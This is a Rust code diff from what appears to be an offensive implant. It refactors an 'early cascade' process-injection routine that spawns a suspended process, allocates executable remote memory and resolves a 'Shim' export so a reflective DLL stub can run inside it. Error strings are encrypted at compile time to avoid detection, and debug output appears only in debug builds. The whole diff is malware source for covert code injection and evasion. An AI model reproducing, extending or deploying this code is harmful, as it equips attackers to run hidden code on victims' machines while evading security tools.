@@ -1,11 +1,8 @@
-use std::{
-    ffi::c_void,
-    ptr::{null_mut, read_unaligned},
-};
+use std::{ffi::c_void, ptr::null_mut};
 
 use shared::tasks::WyrmResult;
 use shared_no_std::{
-    export_resolver::{ExportError, calculate_memory_delta, find_export_from_unmapped_file},
+    export_resolver::{ExportError, find_entrypoint_from_unmapped_image},
     memory::{EarlyCascadePointers, locate_shim_pointers},
 };
 use str_crypter::{decrypt_string, sc};
@@ -17,7 +14,6 @@ use windows_sys::Win32::{
             MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
             VirtualProtectEx,
         },
-        SystemServices::IMAGE_DOS_HEADER,
         Threading::{
             CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, ResumeThread,
             STARTUPINFOA,
@@ -106,13 +102,27 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>, spawn_as: &str) -> Wyr
     // stage for the rDLL stub to run in the newly created process.
     //
 
-    let p_start = match find_shim_export_address(&buf, p_alloc as _) {
+    let p_start = match find_entrypoint_from_unmapped_image(&buf, p_alloc as _, "Shim") {
         Ok(p) => p,
         Err(e) => {
             unsafe { CloseHandle(pi.hThread) };
             unsafe { CloseHandle(pi.hProcess) };
-            dbgprint!("{}", e);
-            return WyrmResult::Err(e);
+
+            let msg = match e {
+                ExportError::ImageTooSmall => sc!("ImageTooSmall", 19).unwrap(),
+                ExportError::ImageUnaligned => sc!("ImageUnaligned", 19).unwrap(),
+                ExportError::ExportNotFound => sc!("ExportNotFound", 19).unwrap(),
+                ExportError::BadImageDelta => sc!("BadImageDelta", 19).unwrap(),
+            };
+
+            #[cfg(debug_assertions)]
+            {
+                use crate::utils::console::print_failed;
+
+                print_failed(&msg);
+            }
+
+            return WyrmResult::Err(msg);
         }
     };
 
@@ -220,38 +230,6 @@ fn execute_early_cascade(
     }
 
     Ok(())
-}
-
-fn find_shim_export_address(
-    buf: &Vec<u8>,
-    base_original_allocation: *const u8,
-) -> Result<*const c_void, String> {
-    match find_export_from_unmapped_file(&buf, "Shim") {
-        Ok(p) => {
-            let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)
-                .ok_or(sc!("Could not calculate memory delta.", 204).unwrap())?;
-            let addr_calculated = unsafe { base_original_allocation.add(addr) };
-            Ok(addr_calculated as _)
-        }
-        Err(e) => {
-            let part = match e {
-                ExportError::ImageTooSmall => sc!("Image too small", 65).unwrap(),
-                ExportError::ImageUnaligned => sc!("Image not aligned", 65).unwrap(),
-                ExportError::ExportNotFound => sc!("Export not found", 65).unwrap(),
-            };
-
-            let msg = format!(
-                "{} {part}",
-                sc!(
-                    "Could not find the Shim address in the PE image to spawn.",
-                    164
-                )
-                .unwrap()
-            );
-            print_failed(&msg);
-            return Err(msg);
-        }
-    }
 }
 
 /// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
